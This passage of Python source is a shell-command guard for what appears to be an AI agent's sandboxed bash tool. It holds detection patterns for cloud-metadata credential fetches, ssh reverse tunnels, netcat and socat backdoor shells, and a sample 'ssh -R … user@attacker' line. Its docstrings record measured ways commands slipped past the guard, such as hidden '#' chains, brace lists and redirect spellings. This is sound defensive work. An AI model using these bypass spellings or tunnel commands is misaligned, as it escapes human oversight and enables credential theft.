_UNRESOLVED_VAR_RE = re.compile(rf"(?:{_PARAM_EXPANSION})+")
# A variable that supplies the *root* of a path (`$HOME/.emrg/config.toml`),
# rather than a whole name on its own (`$DST`). The distinction is what keeps the
# write-target rule below from refusing `cp $SRC $DST` — see it for why.
_UNRESOLVED_ROOT_RE = re.compile(rf"(?:{_PARAM_EXPANSION})+[\\/]")
# A brace list is several words to the shell and one word to this walk (issue
# #1396). `{a,b}` is expanded *before* the command runs, so a destination or a
# target carrying one names a path that is not in the token stream — the same
# case `$` and the backquote already are, and the same failure shape: read
# literally, the token is joined onto the cwd, so every spelling of the list
# reads as being **inside** the workspace, the one direction this guard must
# never drift in. Measured on master `67ba7f52` (predicate only, nothing
# executed), one geometry whose outside directory is outside every allowed root:
# `cd {../emrg-1396-outside,sub} && cat > f` and `cat > {../emrg-1396-outside,inside}/f`
# were both ALLOW, while `/bin/sh` in the same tree wrote the file in the sibling
# directory — this host's `cd` places the shell in the first of the expanded words.
#
# The expansion is a comma or a `..` *inside* a brace pair; a word carrying
# braces with neither (`a{b}c`) is one literal word to the shell as well, so it
# keeps the verdict the join gives it. The search is for the inner pair, which is
# also what makes the nested spelling (`{a,{b,c}}`) not slip past: its inner pair
# is a match even when the outer one is not readable as a list.
#
# The price is stated rather than hidden: a *legitimate* list whose every
# spelling stays inside is refused too (`rm {dist,build}`, `cp a {b,c}`), because
# which of the spellings the command uses is exactly what the text does not say.
# The work-around is the one every refusal in this file names: spell them out.
_BRACE_EXPANSION_RE = re.compile(r"\{[^{}]*(?:,|\.\.)[^{}]*\}")

# The variable a *write target* is rooted in (`$T/f`, `${T}/f`), read as the
# plain name so the value the command gave it can be looked up. The expansion
# operators of `_PARAM_EXPANSION` are deliberately not matched here: the value
# of `${T:?}` is decided by the shell's `:?` and not by any assignment, so there
# is nothing to look up and the token keeps its refusal (issue #1316). The `/`
# is a lookahead rather than part of the match — it is what makes the variable a
# *root* and not a whole operand, and it has to stay in the text the resolved
# value is spliced into (a match that ate it turned `$T/f` into `./innerf`).
_LEADING_VAR_ROOT_RE = re.compile(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?(?=/)")
# The var-is-the-whole-token case (`cd "$D"`, `D=<dir> && cd "$D"`): there is no
# separator after the variable, so the root pattern above — whose whole point is
# the `/` lookahead — has nothing to match and the value would never be looked
# up. The name charset is the same one, for the same reason: an expansion
# operator (`${D:?}`) is decided by the shell rather than by an assignment, and
# a special parameter (`$0`, `$@`) has no assignment to look up at all.
_WHOLE_VAR_RE = re.compile(r"\$\{?([A-Za-z_][A-Za-z0-9_]*)\}?$")

# What a command-local assignment may hold to be usable as a resolution: a
# literal path fragment and nothing else. `T=$(mktemp -d)`, ``T=`uname` ``,
# `T="$A/$B"` and `T="a b"` are values only the shell can build, and
# `T=../outside` is a literal that would move a relative write target out of the
# workspace — so the class is refused rather than resolved (issue #1316).
_ASSIGNED_LITERAL_VALUE_RE = re.compile(r"^[A-Za-z0-9._/+-]+$")

# The same class, spelled the way an *absolute* value is spelled on Windows: the
# charset above cannot express one, because `:` is not in it, so `T=D:/ws && cat >
# "$T/f"` was refused as undecidable however plainly absolute it is. That is the
# false block of issue #1316 surviving on the one platform whose scratch root is
# most likely to be absolute (issue #1354).
#
# `:` is admitted in the drive position only, and only with a forward slash after
# it: a backslash is shlex's escape character, so `D:\ws` reaches this file as a
# word that is not a path at all (`D:ws`) — a separate and older defect, issue
# #1261, which this charset cannot fix and must not pretend to.
#
# Widening the class grants no permission. A value it now admits is *resolved*,
# not trusted: the result is handed to the same `_is_within` / protected-file /
# moved-out checks a POSIX absolute value already goes to, so the change turns
# "unresolvable, so refused" into "placed, so judged". The `..` exclusion still
# applies to both spellings (`_assigned_value_is_decidable`).
_ASSIGNED_DRIVE_ROOTED_VALUE_RE = re.compile(r"^[A-Za-z]:/[A-Za-z0-9._/+-]*$")

# ── Heredocs: a body is DATA unless a program eats it as a program ──────────
# A heredoc body is text on some command's stdin. It is shell *code* only when
# the consumer is a shell (`sh <<EOF` runs the body); for `cat <<EOF` it is
# data, and every `>`, `->`, `rm` or `git checkout .` inside it is a character.
# The scanners below parse a command text with the tokenizer, so a body used to
# be read as shell code by accident of *text* — see
# `_mask_data_heredoc_bodies` for what that cost, measured.
#
# This is an allowlist on purpose, and the direction of the bias is the point:
# a consumer that is not named here keeps today's behaviour (the body is
# scanned), so an unenumerated interpreter — `ssh host <<EOF`, `sed <<EOF`,
# `patch <<EOF` — stays guarded. Naming the *readers* rather than the programs
# that execute is what makes the unenumerated case fail closed.
#
# The interpreters are named because the guard ALREADY allows their inline
# spelling: `python3 -c "print(1 > 0)"` and `python3 -c 'import os;
# os.system("rm -rf /tmp/y")'` are both allowed on master (measured), and the
# same script in a heredoc must not be judged differently for its spelling.
_DATA_READER_CONSUMERS = frozenset({
    "cat", "grep", "egrep", "fgrep", "rg", "wc", "head", "tail", "diff",
    "jq", "nl", "sort", "uniq", "python", "python3", "node",
})

# A second, narrower readership: a tool that eats stdin as a *message* for one
# of its subcommands (issue #1320). `git` cannot go in the set above — that set
# is a property of the *tool*, and git runs a program for other subcommands — so
# the reader is pinned on two further axes: the subcommand, and an operand that
# names stdin (`-F -`, `--file -`, `--file=-`, `-F-`; all four measured against
# git 2.50.1 to put the body into the tag message). Nothing else may be on the
# line, because a global option before the subcommand and an env prefix can both
# decide what the subcommand *does*:
#
#   measured, git 2.50.1, inside a scratch repo — `git -c core.editor=sh commit
#   -F - -e 'BODY'`, with `BODY` one `echo EDITOR_RAN` line, printed
#   EDITOR_RAN and committed: the body ran as a script. So did the same override
#   spelled through the environment (`GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=
#   core.editor GIT_CONFIG_VALUE_0=sh commit -F - -e`), which is why an env
#   prefix forfeits the mask too. The shape issue #1320 names instead,
#   `git -c alias.commit='!sh' commit -F -`, did *not* run it — git refuses to
#   let an alias shadow a builtin, so `commit` stayed the builtin and read the
#   body as a message. The refusal below is therefore load-bearing against the
#   editor route, not against the alias; it costs a rare false positive
#   (`git -C <dir> commit -F -`), which is the direction this guard errs in.
_STDIN_MESSAGE_READERS = {
    "git": frozenset({"commit", "tag"}),
}
_STDIN_OPERAND_SEPARATE = frozenset({"-F", "--file"})
_STDIN_OPERAND_ATTACHED = frozenset({"-F-", "--file=-"})

# ── Containment-escape guard (issue #1102) ─────────────────────────────────
# Borrowed from Claude Code v2.1.257 ("Containment Escape"): block cloud
# metadata-credential fetches and egress-tunnel markers. The write-target
# scan cannot catch these — a metadata fetch is a READ and touches no
# protected file path, so the destination-based scan below is required.

# Cloud metadata endpoints — never legitimate in development commands.
# IMDSv1/v2 (AWS), ECS container creds (AWS), GCP metadata (IP + DNS),
# IMDSv2 IPv6 (AWS).
_METADATA_ENDPOINT_RE = re.compile(
    r"169\.254\.169\.254|169\.254\.170\.2|169\.254\.169\.123|"
    r"metadata\.google\.internal|fd00:ec2::254"
)
# ssh remote/dynamic forward (-R / -D) — the classic egress tunnels
# (`ssh -R 1080:169.254.169.254:80 user@attacker`). Requires a standalone
# `ssh` token (never ssh-add/ssh-agent/ssh-keygen/...), stops at quotes so
# `ssh host 'grep -R x'` (a remote command, not a tunnel) is not flagged, and
# does NOT block `-L` (the common dev port-forward; a `-L` whose destination
# is a metadata endpoint is already caught by the endpoint rule above).
_SSH_TUNNEL_RE = re.compile(
    r"(?<!\S)ssh(?:\.exe)?\s+(?:[^|;&\n'\"]*?\s)?-[a-zA-Z]*[RD][a-zA-Z]*"
)
# ssh long-form forwards (`-o RemoteForward=...` / `-o DynamicForward=...`).
# These are often quoted (`-o 'RemoteForward=1080:localhost:80'`), so this
# rule deliberately does NOT stop at quotes — the RemoteForward=/DynamicForward=
# string has no legitimate non-tunnel use (unlike `-R`, which collides with
# `grep -R` inside remote commands).
_SSH_FORWARD_LONG_RE = re.compile(
    r"(?<!\S)ssh(?![\w-])[^|;&\n]*?\b(?:Remote|Dynamic)Forward\s*="
)
# netcat / ncat with -e/--exec — a reverse/backdoor shell, never legitimate.
_NC_EXEC_RE = re.compile(
    r"\bnc(?:at)?\b[^|;&\n'\"]*?(?:-[a-zA-Z]*e[a-zA-Z]*\b|--exec\b)"
)
# socat with EXEC:/SYSTEM: — a backdoor address, never legitimate.
_SOCAT_EXEC_RE = re.compile(r"\bsocat\b[^|;&\n'\"]*\b(?:EXEC|SYSTEM):")
# IMDSv2 token request header — belt-and-suspenders for URL-obfuscated fetches.
_IMDSV2_TOKEN_RE = re.compile(r"X-aws-ec2-metadata-token")


def _check_containment_escape(cmd: str) -> str | None:
    """Destination-based containment-escape scan (issue #1102, borrowed from
    Claude Code v2.1.257 "Containment Escape").

    Returns a block reason naming the exact escape vector when the command
    fetches cloud metadata credentials or opens an egress tunnel; returns
    None when the command looks clean.

    Complements the write-target scan: ``curl http://169.254.169.254/...``
    touches no protected file path, so ``workspace-write`` target checks pass
    it — the credential exfiltration happens over the network. Runs on both
    checked tiers (read-only blocks writes, but a metadata fetch is a read,
    so the destination check is required there too).
    """
    for label, pattern in (
        ("cloud-metadata endpoint", _METADATA_ENDPOINT_RE),
        ("ssh egress tunnel (-R/-D)", _SSH_TUNNEL_RE),
        ("ssh egress tunnel (Remote/DynamicForward)", _SSH_FORWARD_LONG_RE),
        ("netcat exec backdoor", _NC_EXEC_RE),
        ("socat EXEC/SYSTEM backdoor", _SOCAT_EXEC_RE),
        ("IMDSv2 token request", _IMDSV2_TOKEN_RE),
    ):
        m = pattern.search(cmd)
        if m:
            return (
                f"containment-escape: blocked {label} {m.group(0)!r} "
                "(cloud credential exfiltration guard, issue #1102)"
            )
    return None


# ── Windows path spellings (issue #1261) ────────────────────────────────────
#
# The guard tokenises with `shlex` in POSIX mode, where a backslash is an
# *escape* character. A Windows shell (cmd.exe — the bash tool's subprocess
# shell on that platform) treats the same character as a *path separator*, so
# the two readings of one text disagree by exactly the characters a Windows path
# is made of. Measured on master `cca0b8dc`, `echo x > C:\Users\x\out.txt`
# reached the workspace-write boundary as the single token `C:Usersxout.txt` —
# a *relative* name, therefore "inside the workspace", therefore allowed. Ten
# such spellings measured (redirect incl. append, rm -rf, mv, cp, sed -i,
# find -delete, chained), every one allowed at workspace-write while its
# absolute POSIX twin was refused; `read-only` was unaffected, since that tier
# refuses every target without asking where it resolves.
#
# The repair is a character substitution on the copy the guard tokenises, never
# on the command that is executed: each backslash becomes a placeholder `shlex`
# has no meaning for, so the separators survive the split, and the placeholder
# is put back on the way out. Substitution rather than a "mangled form → raw
# spelling" lookup on purpose — a lookup has a silent failure mode (a key that
# does not match leaves the path mangled and every rule reading it inert),
# while a character that was never removed cannot fail to be restored.
#
# Gated on the shell the command will actually run in. On POSIX a backslash is
# an escape, so `C:\Users\x` genuinely names the relative file `C:Usersx` and
# repairing it there would refuse an ordinary in-workspace write (`echo x >
# my\ file` is the same class of spelling, as issue #1162's cases are).
_WINDOWS_SHELL = os.name == "nt"

# A character no shell command can contain, so the restore cannot corrupt one.
_WINDOWS_BACKSLASH = "\x00"

# Drive-rooted: `C:\…` / `C:/…`. UNC (`\\server\share`) needs no pattern — it
# already reads as rooted through the `\` test in `_is_absolute_path`.
_WINDOWS_DRIVE_RE = re.compile(r"^[A-Za-z]:[\\/]")


def _protect_windows_backslashes(cmd: str) -> str:
    """Make backslashes survive the POSIX split — Windows shells only (#1261)."""
    if not _WINDOWS_SHELL or "\\" not in cmd:
        return cmd
    return cmd.replace("\\", _WINDOWS_BACKSLASH)


def _restore_windows_backslashes(tokens: list[str]) -> list[str]:
    """Undo `_protect_windows_backslashes`, so the guard reads the real spelling."""
    if not _WINDOWS_SHELL:
        return tokens
    return [t.replace(_WINDOWS_BACKSLASH, "\\") for t in tokens]

def _shell_lexer(cmd: str, punctuation) -> "shlex.shlex":
    """A ``shlex`` that reads the line the way the *shell* reads it — comments off.

    ``shlex`` treats ``#`` as a comment **wherever it appears** and drops the rest
    of the line. A shell does not: ``#`` starts a comment only where a **word**
    starts, and inside a word it is an ordinary character. So the shell reads
    ``echo a#&& cd <dir> && git checkout .`` as *three* commands — ``echo a#``,
    ``cd <dir>``, ``git checkout .`` — while the lexer handed the guard the single
    word ``echo a``. Measured on master `e9bd6d8ab003293e`, in a scratch repo
    holding one uncommitted edit: the guard answered ALLOW at ``read-only`` and the
    hidden tail really ran, discarding the edit (issue #1264). The same shape
    reached the path rule — ``echo a#&& rm -rf <outside>/v.txt`` was ALLOWED at
    ``workspace-write``, and ``echo a#&& echo x > <outside>/out.txt`` created a file
    outside the workspace — and the wrapper rule too, via
    ``echo a#&& $SHELL -c 'git checkout .'``.

    This is upstream of every rule, because it decides what the rules get to read.
    The invariant is one-directional, and that direction is the whole point: the
    guard must never read **less** of the line than the shell executes, because
    reading less hides a mutator and work is lost. Reading *more* than the shell
    runs cannot hide one — the over-read text is a comment the shell ignores — so
    the worst case is a refusal of a command that would have done nothing, which is
    the fail-closed side this guard already picks for input it cannot parse.

    The cost is stated rather than hidden: a comment whose *text* contains a chain
    (``ls # ; git checkout .``) is now refused, because telling that comment from
    code means re-deriving the shell's word-start rule — a second parser, which is
    exactly where a hole would come from.
    """
    lex = shlex.shlex(cmd, posix=True, punctuation_chars=punctuation)
    lex.commenters = ""
    return lex


def _split_command_tokens(cmd: str) -> list[str]:
    """Split a shell command into tokens, preserving operators like ``&&``.

    ``shlex`` in POSIX mode with ``punctuation_chars`` keeps quoting semantics:
    a ``>`` inside a quoted argument stays *inside* the token instead of
    becoming an operator (issue #1162), and ``&&`` / ``;`` / ``|`` survive as
    tokens so a chain can be walked.

    Falls back to a whitespace split when the input is unparseable (an
    unterminated quote), because a guard that raises on odd input is worse
    than one that over-blocks it.
    """
    cmd = _protect_windows_backslashes(_strip_line_continuations(cmd))
    try:
        lex = _shell_lexer(cmd, True)
        lex.whitespace_split = True
        return _restore_windows_backslashes(list(lex))
    except ValueError:
        return _restore_windows_backslashes(cmd.split())


def _command_word(tok: str) -> str:
    """A command word without its directory prefix or Windows extension.

    ``/usr/bin/rm`` and ``rm.exe`` name the same program as ``rm``; matching
    only the bare spelling guards the polite form of the command.
    """
    base = tok.rsplit("/", 1)[-1].rsplit("\\", 1)[-1]
    if base.lower().endswith(".exe"):
        base = base[:-4]
    return base


def _args_after_command(tokens: list[str], i: int) -> list[str]:
    """The argument tokens of the command starting at ``tokens[i]``.

    Stops at the next command in a chain, so ``rm -rf a; echo hi`` yields only
    ``a`` — the shell separators are their own tokens after tokenizing.

    A redirection is **stepped over**, not a cut. The shell removes the redirect
    operator and its operand from the word list and keeps every remaining word as an
    argument *wherever the redirect sat*, so ``cp A >/dev/null B`` hands ``cp`` the
    operands ``A`` and ``B``. This walk used to `break` at the first redirect, which
    silently dropped every operand after one. Measured on master `347f023e`, pure
    calls: ``cp A >/dev/null B`` named ``['/dev/null']`` and ``cp A >|/dev/null B``
    named ``['B', '/dev/null']`` — the destinations that follow are unjudged, the
    #1468 direction (a destination the walk never looks at is a destination the
    sandbox never refuses).

    The cut was also asked of the wrong reader. It carried its own list,
    ``("<", ">", ">>", "&>", "&>>")``, while `_is_redirect_operator`'s docstring
    records that same list being two operators short and replaces it with a shape
    test; so ``>&``, ``>|`` and ``<>`` were invisible here. Stepping over rather than
    cutting is what makes the two readers agree, and it is also what keeps the fix
    from trading one hole for another: widening a *cut* would have taken the ``>&``
    spellings from "names the right operand" to "names nothing" — measured, before
    the step existed, as ``cp A 2>&1 B`` naming ``['B']`` on master and ``[]`` after
    the widened cut.

    `<` is stepped over on the same terms even though the shape test excludes a bare
    ``<`` (which it keeps out so `cat < /etc/passwd` does not become a refusal):
    either way the *operand* of a redirect is not a command operand, and the walk
    still names the redirect target through its own reader.
    """
    args: list[str] = []
    skipping_operand = False
    for tok in tokens[i + 1:]:
        if tok in _COMMAND_SEPARATORS:
            break
        if skipping_operand:
            # The word just after an operator is what the redirect consumes: the
            # target file for `>`, the descriptor for `>&`, an input path for `<`.
            skipping_operand = False
            continue
        if tok == "<" or _is_redirect_operator(tok):
            skipping_operand = True
            continue
        args.append(tok)
    return args


def _rsync_run_is_a_read(tokens: list[str], i: int) -> bool:
    """True when an ``rsync`` run writes nothing to the destination it was given.

    Two ways to be a read, both named rather than assumed: the transfer is a
    **dry run** (``-n``, or the ``n`` inside a cluster such as ``-an``; also
    ``--dry-run``), or the source is only **listed** (``--list-only``).

    The question is asked about the *read*, because that is the spelling somebody
    has to ask for: a bare ``rsync -a src dst`` already writes ``dst``, so a rule
    that assumed "write unless proven otherwise" is the only one that can be
    wrong in the direction that loses data.

    Named limit: an ``n`` that is really the *value* of a value-taking option is
    read as a read form and the destination is missed — the attached spelling
    (``rsync -T/tmp/n src dst``, ``rsync -en src dst``). Telling it apart needs the
    per-option grammar this walk refuses to grow, and the two ways of guessing are
    not equally costly: guessing "write" there would refuse ``rsync -an``, which
    people really type, and a dry run is exactly the spelling used to check what a
    copy would do. The spaced spelling (``rsync -T /tmp/n src dst``) is unaffected,
    because a value in its own token is not an option and is never scanned.
    """
    for tok in _args_after_command(tokens, i):
        if tok in _RSYNC_READ_LONG:
            return True
        if not tok.startswith("-") or tok.startswith("--") or len(tok) < 2:
            continue
        if _RSYNC_READ_LETTERS & set(tok[1:]):
            return True
    return False


def _positional_args(
    tokens: list[str],
    i: int,
    options_with_value: frozenset | None = None,
    cluster_value_letters: frozenset[str] = frozenset(),
    cluster_optional_arg_letters: frozenset[str] = frozenset(),
) -> list[str]:
    """The non-option *operands* of the command starting at ``tokens[i]``.

    Unlike a plain "drop anything starting with ``-``" filter, this also drops
    the value that follows an option which takes one. Without that,
    ``truncate -s 0 a.txt`` reports the size ``0`` as the file to be written,
    and the block names the wrong thing — a guard whose message points at a
    token that is not a path is a guard nobody can trust. A lone ``--`` ends
    option parsing, so everything after it is an operand.

    ``options_with_value`` is the table to consult, and it is **per verb** for
    the verbs whose operands issue #1398 added: the same spelling means
    different things to different verbs (``-s`` is a size to `truncate` and
    takes nothing for `ln`), so a caller that knows its verb passes that verb's
    table. Omitting it keeps the historical flat table, which is what the
    earlier callers (`rm`, `mv`, `cp`, `find`, the in-place writers) still read.

    ``cluster_value_letters`` is the table's **short letters**, and it is opt-in: a
    value can also arrive inside a cluster, where the exact-token test above finds
    nothing (``rsync -a src/ dst/ -ve ssh`` carries `ssh` as `-ve`'s value, since a
    cluster's last letter is the one that takes one). It stays opt-in because adding
    the rule to a caller that did not ask for it can *lose* a destination rather than
    gain one: `cp -at <dir> src` is read by `_target_directory_values`, which does not
    parse clusters, so consuming `<dir>` here would leave one operand and name nothing.

    A ``--`` **ends option parsing**, and that sentence was here before the loop
    below obeyed it (issue #1433): the loop skipped the ``--`` and went on
    dropping every dash-led token, so a command whose operand is a file whose own
    name looks like an option named **nothing** — and an empty target list is
    allowed by construction, because the loop that judges targets never runs.
    Measured on master `910a307c`, with this function byte-identical at
    `26449c59` where the fix was written: `rm -- -s` reported ``[]``, i.e. ALLOW
    at both tiers. Ground truth from a scratch directory on this host, read back
    off disk: `printf x > ./-s; rm -- -s` is rc=0 and `./-s` is gone — it really
    deletes, and the name is only an option *shape*.

    So the drop is exactly one flag: once ``--`` has been seen, a ``-``-led token
    is a path and is named. Two spellings stay as they were, and each for its own
    reason. A ``--`` that is the *value* of an option is still a value, because
    the value is consumed before this test is reached — `cp -t -- f` returns
    ``['f']``, the ``--`` having been eaten by `-t`. A second ``--`` is an operand
    like any other, because a file really named ``--`` is what it names: `rm --
    --` returns ``['--']`` (measured here: rc=0, that file gone).

    Named limit, in the other direction: after ``--`` this returns every token,
    so a verb whose grammar continues past ``--`` with something that is not a
    path has that token named too — `find <path> -- -delete` is the case, where
    BSD `find` rejects the ``--`` outright (measured here: rc=1, `find: --:
    unknown primary or operator`, nothing deleted). It is left as a limit rather
    than guessed at: telling a `find` expression from a path needs the per-verb
    grammar this walk refuses to grow, and the token erring here is the safe
    direction — it is only ever *added* to a target list, and a `find` that
    really does delete is already named through the path before the ``--``.

    ``cluster_optional_arg_letters`` names the verb's options whose argument is
    **optional** (getopt's ``b::``), and it is what keeps a cluster of that shape from
    eating a word: an optional argument takes the rest of its own token and never the
    next word, so ``patch -bsd f`` is ``-b sd`` **plus the operand ``f``**. A reader that
    took the ``d`` for an ordinary value-taking letter — what this one did before the
    parameter existed — ate ``f`` instead and named *nothing*, which is the under-block
    direction this guard treats as the worse one: the word is simply dropped, and no
    error has to happen for it. Measured 2026-09-20 on this host (BSD
    `patch 2.0-12u11-Apple`, one file per row, read back off disk): `patch -bsd outside/f`
    rc=0 rewrites `outside/f`, and the same command through the predicate reported ``[]``
    at **both** tiers.

    **A value-taking letter inside a cluster eats the next word too**
    (``_short_cluster_option``), and that is the spelling that displaced a
    destination rather than merely over-naming one. On GNU, ``suffix`` and
    ``target-directory`` are ``required_argument`` for all four of
    ``cp``/``mv``/``ln``/``install`` and ``mode``/``owner``/``group`` are for
    ``install`` (read from the project's own source, 2026-09-20:
    ``cp.c``/``mv.c``/``ln.c``/``install.c``), so in ``cp x dst -aS .bak`` the
    ``-S`` takes the value ``.bak`` and the operands stay ``x`` and ``dst``. This
    reader treated ``-aS`` as flags, left ``.bak`` in the operand list, and the
    last-operand rule then named **``.bak``** — a suffix, not a path — while the
    real destination went unjudged. Measured against master ``edba48ca`` itself
    (that tree's own code, predicate only, nothing executed, ``workspace-write``),
    these four were ALLOW **and named the option's value**:

        cp x <outside>/dst -aS .bak               → ['.bak']
        mv -va x <outside>/m -vS .bak             → ['.bak']
        ln -s x <outside>/l -vS .bak              → ['.bak']
        install -m 644 x <outside>/i -vS .bak     → ['.bak']

    The neighbours that leave no separate word to misread were refused in the same
    geometry, which is what makes the cluster the discriminator and not the verb:
    ``-aS.bak`` (attached), ``-rv`` / ``-avT`` (no value letter in the cluster),
    ``ln -sS .bak x <outside>/l`` and ``install -Sm 644 x <outside>/i`` (the value
    word is not last). BSD's ``cp``/``install`` reject the letter outright
    (measured here: ``cp -aSb`` → ``cp: illegal option -- b``, ``cp --suffix .bak``
    → ``illegal option -- -``), so the GNU grammar is the one this rule follows and
    the one CI's ubuntu leg runs; on BSD the row pins the refusal of a command that
    would not have run either way.

    The rule is applied only where a caller passes its **own verb's** table: those
    tables are that verb's declared value-taking options, while the flat
    ``_OPTIONS_WITH_VALUE`` is a union across verbs (its ``-o`` is not a letter
    every verb reading it accepts), and those callers name *every* operand anyway,
    so a cluster there can only over-name — the safe direction — never displace a
    destination. Named residual: a cluster whose value letter is **not** last
    (``cp -tS .bak src``, where GNU makes ``S`` the target directory) still leaves
    the tokens after it as operands.
    """
    table = _OPTIONS_WITH_VALUE if options_with_value is None else options_with_value
    letters = None if options_with_value is None else _short_option_letters(table)
    out: list[str] = []
    args = _args_after_command(tokens, i)
    skip_next = False
    options_ended = False
    for j, tok in enumerate(args):
        if skip_next:
            skip_next = False
            continue
        if tok == "--" and not options_ended:
            options_ended = True
            continue
        if not options_ended and tok.startswith("-") and tok != "-":
            # `-s0` / `--size=0` carry their value in the same token; only the
            # spaced form consumes the next one.
            if tok in table:
                skip_next = True
            elif (
                cluster_value_letters
                and not tok.startswith("--")
                and tok[-1] in cluster_value_letters
            ):
                skip_next = True
            elif letters:
                cluster = _short_cluster_option(
                    tok, args, j, letters, cluster_optional_arg_letters
                )
                # `attached` means the value rode inside this token, so no word
                # is eaten; the flag alone is handled by the branch above. An option
                # whose argument is *optional* is attached by construction, which is
                # how `patch -bsd f` keeps `f` as an operand.
                if cluster is not None and not cluster[2]:
                    skip_next = True
            continue
        out.append(tok)
    return out


def _is_redirect_operator(tok: str) -> bool:
    """True when ``tok`` is a redirect operator rather than a path.

    Named here so the walk can ask the question twice — once to find a redirect,
    once to refuse to call the *next* operator its target (a quoted `'>'` is an
    operator token by the time quoting is gone).

    Judged by **shape** rather than by a list, because the list is what the first
    version of this predicate was and it was two operators short of the ones a
    shell accepts. Measured on master `b0bd6188` (`bash_tool.py`
    `00b7e8884c95d9be`): `echo x >| /etc/f` and `echo x <> /etc/f` reported the
    targets `[]` at **both** tiers — allowed by `read-only`, whose whole job is to
    refuse a redirect to anything but `/dev/null`, as well as by
    `workspace-write`. Both genuinely write: in a throwaway directory bash and sh
    each created the file for `>|` (the clobber redirect) and bash created it for
    `<>` (read-write), so an empty target list there is a hole rather than an
    opinion. `>>|`, `>>&` and `&>>` created nothing under the shell this walk's
    own runtime uses (`create_subprocess_shell` -> `/bin/sh`; measured here as
    rc=2 syntax errors that write no file), which is why they are covered only
    incidentally — on bash 4+, where `&>>` and `>>&` are valid append-both
    redirects that do write, recognising them as operators is the safe direction
    rather than an unnecessary one.

    The shape test is: the token contains a `>` and no character that could be
    part of a path. That also covers the fd-prefixed spellings (`1>|`, `0<>`,
    `2>&1`, `5>&-`) without enumerating them, and it deliberately keeps a bare
    `<` *out* of the set: `<` reads, so naming its operand a write target would
    turn `cat < /etc/passwd` into a refusal — an over-block in exchange for
    nothing. Erring towards "operator" is the safe direction *because of* what
    the walk does with the answer: an operator is never recorded as a target, so
    recognising more of them only makes the walk look further for the real one.
    """
    return (
        bool(tok)
        and ">" in tok
        and re.fullmatch(r"[<>|&0-9-]+", tok) is not None
    )


def _is_fd_operand(tok: str) -> bool:
    """True when ``tok`` is a file *descriptor* rather than a path.

    Only ever asked about the operand of the ``>&`` operator, where the shell
    reads an all-digits or ``-`` operand as a descriptor to duplicate onto
    (``2>&1``, ``2>&-``) instead of a file to open. The order of ``&`` and ``>``
    is the whole discriminator, and it is the shell's, not a convention: ``&>1``
    is the other operator and really does write a file called ``1``, while
    ``>&1x`` and ``>& out.log`` name files (so spacing and "the operand is
    numeric" are both insufficient signals).

    Measured on master `39edaefa` (`bash_tool.py` `4dce1ffde8902bc1`), each
    command run by bash **and** sh in a fresh scratch directory: six duplication
    spellings (`2>&1`, `1>&2`, `>&2`, `2>&-`, `2>& 1`, and `2>&1` beside a later
    real redirect) created no file in either shell, while every genuine-file
    spelling in the same corpus (`> 1`, `&>1`, `>&1x`, `>& out.log`) really wrote
    the file the walk names. `[0-9]+` rather than ``str.isdigit`` because the
    latter is true of Unicode digits (`²`, `١`), which are not descriptors.
    """
    return tok == "-" or re.fullmatch(r"[0-9]+", tok) is not None


def _fully_quoted_token_indexes(cmd: str, tokens: list[str]) -> set[int] | None:
    """Indexes of ``tokens`` whose word was **entirely quoted** in the source line.

    ``'>'`` and ``>`` dequote to the same token, so once quoting is resolved the
    walk cannot tell a quoted operator from a real one — and the shell reads a
    quoted word as a *path*, never as a redirect. Without that fact the walk
    believed the first operator-shaped token it met, which cost a real target in
    one direction and invented one in the other: `echo '>' > /etc/x` reported
    `['>']` and was allowed to write outside (the under-block #1269 closed) while
    `grep -n '>' file.txt` was refused under `read-only` for "targeting
    'file.txt'" (the over-block this closes — the other half of issue #1268).

    Repaired by lexing the same line a second time with POSIX mode **off**, where
    `shlex` keeps the quote characters in the token, and pairing the two readings
    by index: a pair is fully quoted when the second reading is the first one
    wrapped in matching quotes (`'>'` around `>`). Requiring the *whole* word to
    be wrapped is what keeps a partially quoted word out of the set — `'a'b` and
    `a'b'` both dequote to `ab`, and neither is a quoted word.

    Answers ``None`` — **"cannot answer"** — whenever the two readings disagree
    about how many words there are (`echo 'a'b > '>'`: 4 words with quoting
    resolved, 5 with quoting kept) or the second lex fails. It used to answer the
    empty set for that state, which is a *different* fact: "answered, and no word
    is quoted". The two cannot be the same value, because the walk has to keep
    the safe side in both positions and the fallback is only safe in one of them
    (issue #1280): believing a real redirect was quoted drops its target, while
    believing a quoted one was real only refuses a command that writes nothing —
    true in **operator** position, and false in **target** position, where the
    token that should be named as the path is itself operator-shaped.
    """
    prepped = _protect_windows_backslashes(_strip_line_continuations(cmd))
    try:
        lex = shlex.shlex(prepped, posix=False, punctuation_chars=True)
        lex.commenters = ""
        lex.whitespace_split = True
        second = _restore_windows_backslashes(list(lex))
    except ValueError:
        return None
    if len(second) != len(tokens):
        # The two readings are not known to be the same words, so the pairing
        # below would compare one word with another. Nothing is claimed.
        return None
    quoted: set[int] = set()
    for index, (plain, kept) in enumerate(zip(tokens, second)):
        if (
            len(kept) >= 2
            and kept[0] in "'\""
            and kept[-1] == kept[0]
            and kept[1:-1] == plain
        ):
            quoted.add(index)
    return quoted


_ESCAPED_OPERATOR_CHARS = "><|&;"
"""Characters a backslash can turn from an operator into an ordinary character.

The shell's own rule, not a convention: an escaped character is a *character*, so
`\\>` is the file `>` and `\\|` is the file `|`, while `\\` is a backslash and the
`>` behind it is an operator again. Only the control characters are listed —
masking the rest of the punctuation set would claim a fact the walk never asks
for, and masking a quote would destroy the quoting the lexer is about to read.
"""

_ESCAPE_PLACEHOLDERS = {
    ch: chr(0xE000 + i) for i, ch in enumerate(_ESCAPED_OPERATOR_CHARS)
}
"""One private-use code point per escaped character (#1307).

Private use because a placeholder must not be punctuation (that is the whole
point: `\\>` has to survive the lexer as part of a word) and must not be a
character a command line can plausibly contain. The Windows path already leans on
the same idea for a different reason (`_protect_windows_backslashes`), and the
recovery below returns "cannot say" rather than guessing when the line already
carries a placeholder.
"""


def _restore_escape_placeholders(token: str) -> str:
    """Undo the masking, so the reading can be compared with the plain one."""
    for ch, placeholder in _ESCAPE_PLACEHOLDERS.items():
        token = token.replace(placeholder, ch)
    return token


def _escaped_word_indexes(cmd: str, tokens: list[str]) -> set[int] | None:
    """Indexes of ``tokens`` whose word reached its shape through a **backslash**.

    An escaped operator-shaped word is a *path*: `\\>` is the file `>`, `\\|` is the
    file `|`, and neither is an operator or a command separator. `is_operator`
    excluded the *quoted* case (issues #1268/#1280) but had no counterpart for the
    escaped one, so an escaped word sitting in **target** position was read as an
    operator and the walk lost the real target — measured on master `cc352419`
